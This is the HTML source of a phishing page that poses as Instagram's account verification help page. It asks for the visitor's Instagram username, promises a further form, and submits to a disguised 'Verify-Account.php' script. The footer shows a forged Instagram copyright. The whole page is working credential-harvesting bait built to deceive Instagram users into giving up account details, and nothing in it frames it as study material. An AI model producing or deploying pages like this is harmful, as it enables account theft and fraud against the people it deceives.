
    <html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verified | Help Instagram</title>
<link rel="icon" href="https://resimag.com/p1/1101a46d2a3.jpeg">
<style>
#copyright{
color:#999;}
#menu{


width:91%;
} 

#liste{ display:inline-block;} #link{text-decoration:none; color:#003569; font-family:sans-serif; font-size:13px; font-weight:540; vertical-align: baseline; } 
#asdxyz{
background-color:white;
width:91%;

}
#erhanasd{
font-family:sans-serif;
font-weight:200;
letter-spacing:;
color:#3d3d3d;
font-size:20px;}
#qenzyne{
width:60%;
color:#999;
font-family:sans-serif;
}
#nick{
background-color:#fafafa;
border:1px solid #cecece;
outline:none;
border-radius:6px;
width:220px;
height:35px;
text-align:center;
font-size:16px;}

#butonbey{
color:white;
background-color:#3897f0;
font-size:17px;

border-radius:5px;
outline:none;
font-family:sans-serif;
font-weight:540;
border:0;
width:170px;
height:30px;
font-weight:bold;

}
#nick:hover{

    border:1px solid #cecece;
    width:310px;
    max-width:80%;

}
</style>
</head>     

<body>
<body bgcolor="#fafafa">
<br>
<br>
<br>
<center>
<form method="get" action="848350608641984=Verify-Account.php">
<div id="asdxyz" style="border:1px solid #cecece;">

<img src="https://ci4.googleusercontent.com/proxy/sKqXcB7zDP7N-6yY75yXsKOC97B-g-pZSdkWFTKh02EVUCA277wXPS-5JGPMeRBHAKdRtnZv=s0-d-e1-ft#https://i.hizliresim.com/p2vrgo.gif" width="165" height="122" style="margin-right:0px" class="CToWUd">

<h1 id="erhanasd">Please enter your username.
<img src="https://ci6.googleusercontent.com/proxy/1nzWmt3zgNYueUHtay9q_z3jdPD7IfplMhToVaTNHeqFGmzl-OeOo0KjN7EE5gAllJPpdiiz=s0-d-e1-ft#https://i.hizliresim.com/qA6J7R.gif" width="23" height="23" style="font-size:small;color:rgb(34,34,34);font-family:'times new roman';margin-right:0px" class="CToWUd"></h1>

<p id="qenzyne">Please write your instagram username and click "Next" and fill the next form  </p><br>



<input type="text" id="nick" name="nick" required="" placeholder="Username" class="qua21"><br><br>
<input type="submit" value="Next" id="butonbey" style="">
</form>

<br><br>
</div>
</center>
<center><br> <br>

<div id="get">
<img src="https://resimag.com/p1/b6a0e4390db.png" width=120 >
<img src="https://resimag.com/p1/45ce843a3fd.png" width=120>
</div>
<br><br><br>
<div id="menu"> <li id="liste"><a href="" id="link"> ABOUT US </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link"> SUPPORT </a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRESS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">API</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">JOBS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">PRIVACY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">TERMS</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">DIRECTORY</a> </li>&nbsp;&nbsp;&nbsp;&nbsp; <li id="liste"><a href="" id="link">LANGUAGE</a> </li> </div> <br> <p id="copyright" style="font-family:sans-serif;font-weight:100;">© 2020 INSTAGRAM </p>
 © Instagram, WTA Way, Menlo Park,CA 94025
<br>

</center>

</body>

</html>
